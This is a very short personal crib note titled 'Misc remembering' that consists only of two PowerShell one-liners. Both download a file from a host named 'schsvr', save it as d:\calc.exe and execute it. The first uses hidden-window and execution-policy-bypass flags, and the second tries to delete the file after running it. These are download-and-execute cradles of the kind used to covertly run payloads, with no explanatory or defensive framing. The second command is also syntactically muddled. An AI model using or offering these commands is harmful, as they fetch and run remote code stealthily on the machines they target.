Misc remembering

powershell -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadFile('http://schsvr/calc.txt', 'd:\calc.exe'); Start-Process 'd:\calc.exe'"

powershell "IEX(New-Object Net.WebClient).DownloadFile('http://schsvr/calc.exe', 'd:\calc.exe'); Start-Process 'd:\calc.exe' del 'd:\calc.exe'"
